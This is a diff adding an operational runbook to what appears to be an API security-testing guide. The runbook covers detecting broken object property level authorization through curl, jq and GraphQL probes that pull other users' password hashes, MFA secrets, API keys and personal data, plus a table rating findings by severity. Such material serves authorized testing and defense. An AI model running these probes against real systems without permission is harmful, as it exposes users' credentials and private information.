@@ -118,6 +118,86 @@ GET /api/orders/123?fields=user(*)
 
 Sub-resource expansion often skips the per-property auth check.
 
+## Operational Runbook
+
+Once a candidate endpoint is identified (any JSON-returning GET that's per-user-data), this is the canonical BOPLA detection flow.
+
+### Step 1 — diff the response shapes
+
+```bash
+# Capture YOUR OWN response (full property set)
+curl -s '<TARGET>/api/users/me' -H "Authorization: Bearer $YOUR_TOKEN" | jq . > /tmp/own.json
+
+# Capture the public / listed version (what others see)
+curl -s '<TARGET>/api/users/me/public' -H "Authorization: Bearer $YOUR_TOKEN" | jq . > /tmp/public.json
+
+# Diff — extra fields in own.json that don't appear in public.json
+# are candidates for BOPLA review
+diff <(jq -S 'keys' /tmp/own.json) <(jq -S 'keys' /tmp/public.json)
+```
+
+### Step 2 — sensitive-property dictionary scan
+
+```bash
+# Pull every field from a single response
+curl -s '<TARGET>/api/users/123' -H "Authorization: Bearer $TOKEN" | jq -r 'paths(scalars) | join(".")' > /tmp/fields.txt
+
+# Grep for sensitive markers
+grep -iE "password|secret|token|key|hash|salt|mfa|totp|ssn|tax|api_key|stripe|admin|internal|is_staff|is_superuser|risk|score|kyc" /tmp/fields.txt
+```
+
+Each hit is a finding candidate.
+
+### Step 3 — confirm cross-account leakage
+
+```bash
+# As USER_A (you), read USER_B's profile
+curl -s "<TARGET>/api/users/$OTHER_USER_ID" -H "Authorization: Bearer $YOUR_TOKEN" | jq .
+
+# If response includes USER_B's `email_verified`, `last_login_ip`,
+# `is_staff`, `mfa_secret`, etc. — that's BOPLA. Document each leaked field.
+```
+
+### Step 4 — GraphQL field-by-field probe
+
+```graphql
+# Try to query sensitive fields directly via introspection
+query {
+  user(id: "OTHER_USER_ID") {
+    id email
+    passwordHash    # if accepted → CWE-200
+    apiKey
+    isAdmin
+    permissions
+    internalNotes
+  }
+}
+```
+
+The server should reject queries for any field the caller can't see — many implementations only check object-level access, not field-level.
+
+### Step 5 — `?expand=` / `?include=` abuse
+
+```bash
+# Try expanding to related resources you shouldn't see
+curl -s "<TARGET>/api/orders/123?expand=user" -H "Authorization: Bearer $TOKEN"
+curl -s "<TARGET>/api/orders/123?include=user.password_hash"
+curl -s "<TARGET>/api/orders/123?fields=user(*)"
+curl -s "<TARGET>/api/orders/123?expand=user.internal_notes,admin"
+```
+
+### Step 6 — record evidence per leaked field
+
+| Field | CWE | Severity |
+|---|---|---|
+| `password_hash`, `mfa_secret`, `api_key` | CWE-256 / CWE-522 | **critical** |
+| `last_login_ip`, `device_fingerprint`, `failed_login_count` | CWE-200 | high |
+| `is_admin`, `permissions[]`, `role` | CWE-285 | high (recon for next attack) |
+| `tax_id`, `ssn`, `dob`, `phone` | PII | high (regulatory) |
+| `internal_notes`, `risk_score` | CWE-200 | medium |
+
+Document one finding per (endpoint, leaked-field) pair.
+
 ## Verification
 
 For each suspected over-exposed field:
